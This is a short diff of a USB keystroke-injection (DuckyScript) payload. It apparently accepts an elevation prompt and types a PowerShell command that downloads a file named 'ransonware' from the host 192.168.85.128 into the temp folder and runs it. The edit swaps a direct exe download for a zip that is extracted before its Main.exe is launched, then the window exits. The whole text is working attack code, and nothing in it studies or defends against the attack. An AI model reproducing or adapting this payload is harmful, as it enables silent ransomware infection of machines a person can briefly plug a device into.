@@ -7,9 +7,5 @@ ENTER
 DELAY 500
 ALT y
 DELAY 500
-STRING wget 'http://192.168.85.128/ransonware.exe' -outfile $Env:temp\ransonware.exe ; .$Env:temp\ransonware.exe
-ENTER
-DELAY 200
-STRING exit
-DELAY 200
+STRING Invoke-WebRequest -Uri http://192.168.85.128/ransonware.zip -OutFile $Env:temp\ransonware.zip ; Expand-Archive $Env:temp\ransonware.zip -dest $Env:temp\ -force ; cd $Env:temp\ransonware\ ; .\Main.exe ; exit
 ENTER
